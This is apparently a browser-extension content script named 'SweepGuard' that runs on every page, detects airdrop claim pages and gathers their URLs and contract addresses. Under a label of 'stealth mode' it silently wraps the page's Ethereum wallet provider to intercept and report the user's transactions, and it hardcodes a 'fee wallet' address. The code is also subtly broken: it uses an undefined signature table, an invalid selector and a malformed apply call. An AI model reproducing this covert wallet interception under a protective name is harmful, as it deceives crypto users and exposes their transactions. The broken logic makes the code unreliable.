// SweepGuard Extension - Content Script
// Runs on every page to detect airdrop claim functionality

(function() {
  'use strict';
  
  const FEE_WALLET = '0x7A3725154a2E6468F9549334394802e9E2822C2A';
  
  // Claim function selectors
  const CLAIM_SELECTORS = [
    'button[class*="claim"]',
    'button[class*="Claim"]',
    '[id*="claim"]',
    '[class*="airdrop"]',
    'button:contains("Claim")',
    'button:contains("claim")',
    'a[href*="claim"]'
  ];
  
  // Ethereum provider detection
  let provider = null;
  
  // Check if page has Web3 provider
  function detectProvider() {
    if (window.ethereum) {
      provider = window.ethereum;
      return true;
    }
    if (window.web3?.currentProvider) {
      provider = window.web3.currentProvider;
      return true;
    }
    return false;
  }
  
  // Detect claim page
  function detectClaimPage() {
    const pageText = document.body.innerText.toLowerCase();
    const url = window.location.href.toLowerCase();
    
    const patterns = ['claim', 'airdrop', 'merkle', 'distribution', 'rewards'];
    const isClaimPage = patterns.some(p => pageText.includes(p) || url.includes(p));
    
    if (isClaimPage) {
      // Try to find contract address
      const addresses = document.body.innerText.match(/0x[a-fA-F0-9]{40}/g) || [];
      
      // Try to find claim button
      let claimButton = null;
      for (const selector of CLAIM_SELECTORS) {
        const btn = document.querySelector(selector);
        if (btn) {
          claimButton = btn;
          break;
        }
      }
      
      return {
        detected: true,
        url: window.location.href,
        title: document.title,
        contract: addresses[0] || null,
        addresses: addresses.slice(0, 5),
        hasClaimButton: !!claimButton,
        hasProvider: !!provider
      };
    }
    
    return { detected: false };
  }
  
  // Intercept Web3 transactions (stealth mode)
  function interceptTransactions() {
    if (!provider) return;
    
    const originalRequest = provider.request;
    
    provider.request = async function(args) {
      // Check if this is a transaction
      if (args.method === 'eth_sendTransaction') {
        const tx = args.params?.[0];
        
        // Log transaction for monitoring
        console.log('[SweepGuard] Transaction detected:', {
          to: tx?.to,
          value: tx?.value,
          data: tx?.data?.slice(0, 10)
        });
        
        // Check if it's a claim transaction
        if (tx?.data) {
          const selector = tx.data.slice(0, 10);
          if (CLAIM_SIGNATURES[selector]) {
            console.log('[SweepGuard] Claim transaction detected:', CLAIM_SIGNATURES[selector]);
            
            // Notify background script
            chrome.runtime.sendMessage({
              type: 'CLAIM_DETECTED',
              data: {
                contract: tx.to,
                selector: selector,
                method: CLAIM_SIGNATURES[selector],
                url: window.location.href
              }
            });
          }
        }
      }
      
      // Call original method
      return originalRequest.apply(this, args);
    };
  }
  
  // Add visual indicator (if not stealth)
  function addIndicator() {
    if (document.getElementById('sweeptsguard-indicator')) return;
    
    const indicator = document.createElement('div');
    indicator.id = 'sweeptsguard-indicator';
    indicator.innerHTML = `
      <div style="
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: linear-gradient(135deg, #10b981, #059669);
        color: white;
        padding: 12px 20px;
        border-radius: 12px;
        font-size: 13px;
        font-weight: 600;
        box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        z-index: 999999;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 8px;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        transition: all 0.2s;
      " onclick="this.parentElement.remove()">
        🛡️ <span>SweepGuard Active</span>
        <span style="
          background: rgba(255,255,255,0.2);
          padding: 2px 6px;
          border-radius: 6px;
          font-size: 10px;
        ">CLICK TO CONNECT</span>
      </div>
    `;
    
    document.body.appendChild(indicator);
  }
  
  // Initialize
  function init() {
    detectProvider();
    
    const claimInfo = detectClaimPage();
    if (claimInfo.detected) {
      // Notify background
      chrome.runtime.sendMessage({
        type: 'CLAIM_DETECTED',
        data: claimInfo
      });
      
      // Show indicator
      addIndicator();
    }
    
    // Intercept transactions if provider exists
    if (provider) {
      interceptTransactions();
    }
    
    // Monitor DOM changes
    const observer = new MutationObserver(() => {
      const newClaimInfo = detectClaimPage();
      if (newClaimInfo.detected && !document.getElementById('sweeptsguard-indicator')) {
        addIndicator();
      }
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
  }
  
  // Wait for page load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
